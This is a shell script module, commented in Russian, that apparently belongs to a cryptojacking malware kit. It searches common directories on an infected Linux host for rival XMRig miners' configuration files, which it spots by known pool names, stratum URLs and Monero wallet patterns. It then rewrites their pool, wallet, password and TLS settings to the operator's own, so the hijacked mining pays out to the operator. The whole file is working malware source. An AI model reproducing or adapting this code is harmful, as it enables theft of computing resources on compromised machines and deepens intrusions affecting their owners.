#!/bin/sh
# 25-patch.sh — перехват чужих майнеров: правим их конфиги на свои.
# Порты их safe_patch_args / replace_pool_user, но не по двум путям, а поиском
# по типовым местам: systemd-кэш, /opt, /usr/local, /var/tmp, /tmp, $HOME.

# известные пулы, которые надо переписать на наш
KF_POOL_PAT='moneroocean\.stream|c3pool\.(com|org)|minexmr|supportxmr|nanopool|2miners|herominers|hashvault|monerohash|moneropool|rxpool'

# какой текст ставим вместо чужого кошелька
KF_REPL_WALLET() { printf '%s' "${KF_WALLET:-}"; }
KF_REPL_POOL()   { printf '%s' "${KF_POOL:-}"; }

# 1. файлы с XMRIG_ARGS="..." — их safe_patch_args
kf_patch_args_files() {
  _pa_n=0
  _pa_list=$(find /lib/systemd/cache /usr/local/bin /opt /var/tmp /tmp \
             -maxdepth 4 -type f -size -512k -readable 2>/dev/null | grep -v "\.sh$" | head -200)
  [ -n "$_pa_list" ] || return 0
  for _pa_f in $_pa_list; do
    case "$_pa_f" in "${KF_ROOT:-/var/tmp/.kf}"*) continue ;; esac
    grep -q '^XMRIG_ARGS=' "$_pa_f" 2>/dev/null || continue
    grep -qE -- '-o[[:space:]]+[^[:space:]]+' "$_pa_f" 2>/dev/null || continue
    grep -qE -- '-u[[:space:]]+[^[:space:]]+' "$_pa_f" 2>/dev/null || continue
    _pa_val="-o $(KF_REPL_POOL) -u $(KF_REPL_WALLET).${KF_ID:-x}"
    _pa_esc=$(printf '%s' "$_pa_val" | sed 's/[\/&]/\\&/g')
    if sed -i "s|^XMRIG_ARGS=\"[^\"]*\"$|XMRIG_ARGS=\"$_pa_esc\"|" "$_pa_f" 2>/dev/null; then
      _pa_n=$((_pa_n + 1))
    fi
  done
  [ "$_pa_n" -gt 0 ] && kf_log "patch: переписано XMRIG_ARGS в $_pa_n файлах"
  return 0
}

# 2. JSON-конфиги чужих майнеров: url и user — их replace_pool_user
kf_patch_json_configs() {
  _pj_n=0
  _pj_list=$(find /var/tmp /tmp /dev/shm /opt /usr/local /lib/systemd/cache "${HOME:-/nonexistent}" \
             -maxdepth 4 -type f -name '*.json' -size -64k -readable 2>/dev/null | head -200)
  [ -n "$_pj_list" ] || return 0
  for _pj_f in $_pj_list; do
    case "$_pj_f" in "${KF_ROOT:-/var/tmp/.kf}"*) continue ;; esac
    # сильный признак: stratum-протокол, известный пул или XMR-кошелёк (95 символов)
    grep -qE "stratum\+(tcp|ssl)|${KF_POOL_PAT}|4[1-9A-HJ-NP-Za-km-z]{94}" "$_pj_f" 2>/dev/null || continue
    # и наличие поля с адресом/получателем
    grep -qE "\"(url|pool|host)\"[[:space:]]*:" "$_pj_f" 2>/dev/null || continue
    # крупные файлы не трогаем: конфиг майнера всегда мелкий
    [ "$(wc -c < "$_pj_f" 2>/dev/null || echo 0)" -le 65536 ] || continue
    _pj_tmp="${_pj_f}.kfp.$$"
    _pj_pool=$(KF_REPL_POOL)
    _pj_host="${_pj_pool%%:*}"
    _pj_port="${_pj_pool##*:}"
    case "$_pj_port" in 443|20004|33333|14444) _pj_tls=true ;; *) _pj_tls=false ;; esac
    sed -E "s|\"url\"([[:space:]]*:[[:space:]]*)\"[^\"]*\"|\"url\"\1\"$(KF_REPL_POOL)\"|g; \
            s|\"user\"([[:space:]]*:[[:space:]]*)\"[^\"]*\"|\"user\"\1\"$(KF_REPL_WALLET).${KF_ID:-x}\"|g; \
            s|\"pass\"([[:space:]]*:[[:space:]]*)\"[^\"]*\"|\"pass\"\1\"x\"|g; \
            s|\"sni\"([[:space:]]*:[[:space:]]*)\"[^\"]*\"|\"sni\"\1\"${_pj_host}\"|g; \
            s@\"tls\"([[:space:]]*:[[:space:]]*)(true|false)@\"tls\"\1${_pj_tls}@g" \
      "$_pj_f" > "$_pj_tmp" 2>/dev/null || { rm -f "$_pj_tmp"; continue; }
    [ -s "$_pj_tmp" ] && mv -f "$_pj_tmp" "$_pj_f" 2>/dev/null && _pj_n=$((_pj_n + 1))
    rm -f "$_pj_tmp" 2>/dev/null
  done
  [ "$_pj_n" -gt 0 ] && kf_log "patch: переписано JSON-конфигов: $_pj_n"
  return 0
}

kf_patch_rival_configs() {
  kf_patch_args_files
  kf_patch_json_configs
  return 0
}
